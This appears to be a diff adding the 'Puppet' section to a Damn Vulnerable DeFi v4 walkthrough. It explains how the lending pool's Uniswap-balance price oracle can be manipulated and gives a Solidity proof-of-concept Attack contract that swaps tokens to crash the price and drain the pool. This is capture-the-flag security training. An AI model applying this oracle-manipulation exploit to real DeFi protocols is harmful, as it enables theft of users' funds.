@@ -384,3 +384,55 @@ contract Attack {
 Run `forge test --mc CompromisedChallenge` to validate test
 
 ---
+
+## 8.PUPPET
+
+### Objective
+
+_from `_isSolved()`in test_
+
+1. _Player executed a single transaction_ **CAN'T BE MEET**
+2. _All tokens of the lending pool were deposited into the recovery account_
+
+### Attack Analysis
+
+- The vulnerability relays in that the contract uses balances of ETH and DVT to compute the prices, see `_computeOraclePrice()`.
+- An attacker could swap DVT tokens in the Uniswap Pool and influence the prices of the Lending Pool. This being particular easy in this case because of the low amount of assets in the pool.
+- Then, the attacker could borrow assets in the lending pool at an unexpected price and drain its liquidity.
+
+### POC
+
+See [test/puppet/Puppet.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet/Puppet.t.sol)
+
+```solidity
+function test_puppet() public checkSolvedByPlayer {
+    Attack attackPuppet = new Attack{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange);
+
+    token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);
+    attackPuppet.exploit(POOL_INITIAL_TOKEN_BALANCE, recovery);
+}
+
+contract Attack {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+
+    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    receive() external payable {}
+
+    function exploit(uint _amount, address _recovery) public {
+        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
+        uniswapV1Exchange.tokenToEthTransferInput(token.balanceOf(address(this)), 1, block.timestamp, address(this));
+        lendingPool.borrow{value: 20e18}(_amount, _recovery);
+    }
+}
+```
+
+Run `forge test --mp test/puppet/Puppet.t.sol` to validate test
+
+---
